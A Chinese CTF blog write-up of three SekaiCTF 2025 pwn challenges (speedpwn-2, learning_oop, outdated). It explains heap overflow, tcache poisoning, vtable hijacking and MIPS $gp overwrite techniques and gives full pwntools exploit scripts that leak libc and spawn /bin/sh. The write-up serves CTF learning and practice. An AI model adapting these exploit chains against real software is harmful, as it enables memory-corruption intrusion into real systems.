---
title: sekaictf-2025-pwn
tags:
    - XCTF
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# sekaictf--pwn复现 
## 前言

备战下一场xctf分站赛

## speedpwn-2

这是一道tcache 利用的题目，赛后复盘是有源码的，但我们这里还是从写题的角度进行一个分析

### ida分析
![图1](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901184359282.png)

 `main` 函数 首先申请了`0x190`大小的堆块作为一块画布, 然后循环进行操作. 每次循环的开始会调用`print_canvas` 把画布的内容打印出来,然后用户可以输入`p,r,h` 进行对应的操作
 1. p , 修改堆块的一个字节
 2. r , 重新申请堆块
 3. h , 打印操作的说明

图1 就是 r , 对应的操作

![图2](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901185458942.png)

图2 这里是p , 对应的操作.
在75 行这里,就是一个明显的溢出漏洞. 因为这里没有对范围的检测 , 所以我们可以输入非法值 , 去修改不在这个堆块范围内的堆空间的值 .

### 思路分析

题目环境是 2.34的libc

1. 首先是泄露libc . 题目没有开启`ALSR`和`FULL RELRO` ,  可以从`ida`里获取函数`plt`的地址 , 同时可以修改`got` 表 . 首先 ,  利用 溢出漏洞 ,  修改 `tcache_perthread_struct` 的 `counts` 和 `entries`, 把 `.got`表 附近的某一段 放入`tcache bins` 中 ,  再利用 `r` 把这个块空间分配出来.
2. 然后是 ,  修改`got` 表. 利用上面的溢出漏洞 , 把 `free` 修改为`printf`, 利用格式化字符串  , 泄露出`libc`.
3.  重复 1 的步骤 , 把这个堆块 重新申请回来. 因为当时`free` 被修改为了 `printf`, 所以不能直接申请 ,  得重复1 的步骤.
4. 这一次把free修改为system , 然后把堆块内容设置为`/bin/sh\x00`

### exp
```python
from esy import *
context.log_level="debug"
url=""
port=0
io,elf=loadfile("./chall",url,port)
libc=ELF("./libc.so.6")

def pr_c(r,l,c):
	io.sendlineafter("> ",b"p")
	io.sendline(str(r))
	io.sendline(str(l))
	io.sendline(hex(c)[2:])

def re_c(r,l):
	io.sendlineafter("> ",b"r")
	io.sendline(str(r))
	io.sendline(str(l))	
gdb.attach(io,"b *0x401605")
pr_c(0,-0x290,0x1)
bss=0x404070
i=0
while bss > 0:
	pr_c(0,-0x210+i,bss & 0xff)
	i+=1
	bss>>=8
	
re_c(1,0x10)
printf=0x401100
i=0
for i in range(8):
	pr_c(0,-0x70+i,printf & 0xff)
	printf>>=8	
	
pay=b"%17$p"
for i,j in enumerate(pay):
    pr_c(0, i, j) 
re_c(20,20)

leak=int(io.recv(14),16)
libc_base=leak-0x2a1ca
system=libc_base+0x58750 
logv("libc_base",hex(libc_base))
logv("system",hex(system))

pr_c(0,-0x290,0x1)
i=0
bss=0x404070
while bss > 0:
	pr_c(0,-0x210+i,bss & 0xff)
	i+=1
	bss>>=8
re_c(1,0x10)
for i in range(8):
	pr_c(0,-0x70+i,system & 0xff)
	system>>=8	
pay=b"/bin/sh\x00"
for i,j in enumerate(pay):
    pr_c(0, i, j)	
re_c(20,20)	
	
io.interactive()

```

## learning_oop

### ida分析

![图3](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901194344121.png)


首先漏洞点 ,  很明显是`set_name` 函数中的溢出漏洞 , 可以往下溢出覆盖下面的堆块. 然后堆块申请都是固定大小`0x120`

可以看到这是一个`c++`的程序 ,  他的堆块都是 作为对象申请的. 这里应该是 用 `Animal` 这样一个类 , 然后 `Dog`,`Cat`,`Horse`,`Parrot` 类继承了`Animal`,并对其中的某些方法重写了.

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901203517642.png)

在初始化一个动物的时候 , 在`fd` 的位置 写了一个虚表的地址 ,后续的函数调用都是靠这个地址去寻找和调用函数.

年龄,饥饿值,体力,其实是堆块最后`0x10`字节保存的数据. 同时 ,  意识到 ,  可以溢出修改这个部分 , 去控制 动物的 这些信息.

![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901204229246.png)

这里 可以通过控制 `fd` 也就是劫持虚表 ,  来完成调用自己想要的函数.

### 思路分析

题目环境是2.39的libc . (没有版本讲堆题,都是在耍流氓)

1. 首先要泄露`libc` , 然后劫持虚表 , 这里应该是很容易想到的. 那么如何泄露`libc`呢? 肯定是通过`unsorted bin` 了. 然后让堆块进入`unsorted bin`呢? 如果填满一个`tcache bins` , 再 `free` 一个`0x120` 的堆块, 看样子可行,但可以没有`uaf` 漏洞,这样利用会很困难. 所以 , 通过溢出修改堆块 的`size` 造一个0x481 的堆块 ,  造一个重叠. 因为这个大小的堆块超过了`tcahce bins`的大小会直接进入`unsorted bin`.
2. 这个时候 再申请一个堆块 , `arena`信息就会写入到下一个堆块的`name`的位置, 如果此时下一个堆块恰好`die` ,就会触发`get_name` 把信息泄露出来.
3. 然后劫持`vtable` ,我们通过在堆上布置一个虚表,在创建成功后,程序会返回堆的地址. 然后只要有合适的`gadgets`, 就可以调用`system`. 这里肯定需要的是控制`rdi`, 同时需要`call`

### exp

```python
from esy import *
context.log_level='debug'
#context.terminal=["tmux","splitw","-h","-l","66%"]
io = process("./learning_oop")
def menu(op):
    io.sendlineafter("> ",str(op))

def add(species,name):
    menu(1)
    io.sendlineafter("4=Horse): ",str(species))
    io.sendlineafter("Enter name: \n",name)

def play(idx):
    menu(2)
    io.sendlineafter("Which pet? \n",str(idx))

def feed(idx):
    menu(3)
    io.sendlineafter("Which pet? \n",str(idx))

def reset(idx):
    menu(4)
    io.sendlineafter("Which pet? \n",str(idx))

add(1,b"a"*0x100+p32(6)+p32(6))
add(3,b"a"*0x100+p32(5)+p32(5))

add(2,b"a"*0x100+p32(7)+p32(7))
add(2,b"a"*0x100+p32(6)+p32(6))
add(2,b"a"*0x100+p32(5)+p32(5))
add(2,b"a"*0x100+p32(4)+p32(4))

add(3,b"a"*0x100+p32(2)+p32(2))
add(1,b"a"*0x100+p32(0x10)+p32(0x10)+b"a"*8+p64(0x481))


add(2,b"aaaa")
io.recvlines(1)
arena=u64(io.recv(6).ljust(8,b"\x00"))
logv("arena",hex(arena))

libcbase = arena - 0x203b20
logv("libcbase",hex(libcbase))
'''
题目的
0x00000000001cb42f : /bin/sh
0x000000000009ca97 : mov rdi, qword ptr [rax + 0x640] ; call qword ptr [rax + 0x638]
我的
0x0000000000094ab6 : mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]
0x00000000001d8678 : /bin/sh
'''
bin_sh=libcbase+0x1cb42f
set_rdi=libcbase+0x9ca97
system=libcbase+0x582d2
logv("system",hex(system))
logv("bin_sh",hex(bin_sh))
##  这里的偏移需要对这gdb去找
add(1,p64(set_rdi)*4+b"W"*0xe0+p32(5)+p32(5)+p64(3)+p64(0xd281)+b"a"*(0x520-0x128)+p64(system)+p64(bin_sh))#+p64(bin_sh))
io.recvuntil("Adopted new pet: ")
vtable=int(io.recv(14),16)+8

logv("vtable",hex(vtable))

add(1,p64(set_rdi)*8)
gdb.attach(io,"b *$rebase(0x143C)")
add(1,b"a"*0x100+p32(5)+p32(5)+p64(3)+p64(0x121)+p64(vtable))

io.interactive()

```

## outdated 

### ida分析

### exp
```python
from pwn import *
from subprocess import getoutput


# initialize the binary
build = 'mipsel32r6-musl'
binary = "./outdated"
elf = context.binary = ELF(binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)
libc = ELF('./libc.so',checksec=False)

gs = """
set architecture mips:isa32r6
break *main+536
continue
"""

if args.REMOTE:
    p = remote("outdated.chals.sekai.team", 1337, ssl=True)
    
    ### SOLVE POW ###
    cmd = p.recvline().decode().strip().removeprefix("proof of work: ")
    print(f"Solving POW: {cmd}")
    answer = getoutput(cmd)
    p.sendlineafter(b"solution: ", answer.encode())
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','./:/target/ctf','-p','1234:1234',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/outdated'])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe=binary)
else:
    p = docker.process(['run','-i','--rm','-v','./:/target/ctf',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/outdated'])


### GET EXE LEAK ###
p.recvuntil(b'Here')
main_addr = int(p.recvline().strip().split(b' ')[-1],16)
print(f"main() = {hex(main_addr)}")


### GP OVERWRITE 1 ###
"""
(using example addresses)
old $gp = 0xf98000, puts() = $gp-0x7f84, exit() = $gp-0x7fac, thanks = $gp-0x7fd0
new $gp = 0xf98090, puts() = 0xf9010c, exit() = 0xf900e4, thanks = 0xf900c0 (game_name @ 0xf900c0)

Our goal is to turn puts("Thanks for playing") into puts_blue(GOT[puts])
and exit(0) into main(0)
"""
fake_got1 = flat(
    # 0xf900c0
    p32(main_addr + 0x1f6ac - 0x118c), p32(0), p32(0), p32(0), # GOT[puts] - main = 0x1f6ac (offset for "Thanks" string)
    
    # 0xf900d0
    p32(0), p32(0), p32(0), p32(0),
    
    # 0xf900e0
    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()
    
    # 0xf900f0
    p32(0), p32(0), p32(0), p32(0),

    # 0xf90100
    p32(0), p32(0), p32(0), p32(main_addr - 0x80), # offset from main() to puts_blue()
)
p.sendline(fake_got1)                                   # name (fake GOT in global)
p.sendline(b'-12')                                      # offset to stored $gp
p.sendline(b'32912')                                    # least significant 2 bytes of new $gp


### GET LIBC LEAK ###
p.recvuntil(b'in your game')
p.recvline()
puts_addr = int.from_bytes(p.recvline()[5:8], 'little')
print(f"puts() = {hex(puts_addr)}")
libc.address = puts_addr - libc.symbols['puts']


### GP OVERWRITE 2 ###
fake_got2 = flat(
    # 0xf900c0
    p32(next(libc.search(b'/bin/sh\0')) - 0x118c), p32(0), p32(0), p32(0), # "/bin/sh"
    
    # 0xf900d0
    p32(0), p32(0), p32(0), p32(0),
    
    # 0xf900e0
    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()
    
    # 0xf900f0
    p32(0), p32(0), p32(0), p32(0),

    # 0xf90100
    p32(0), p32(0), p32(0), p32(libc.sym['system']), # system()
)
p.sendline(fake_got2)                                   # name (fake GOT in global)
p.sendline(b'-12')                                      # offset to stored $gp
p.sendline(b'32912')                                    # least significant 2 bytes of new $gp

p.interactive()

```
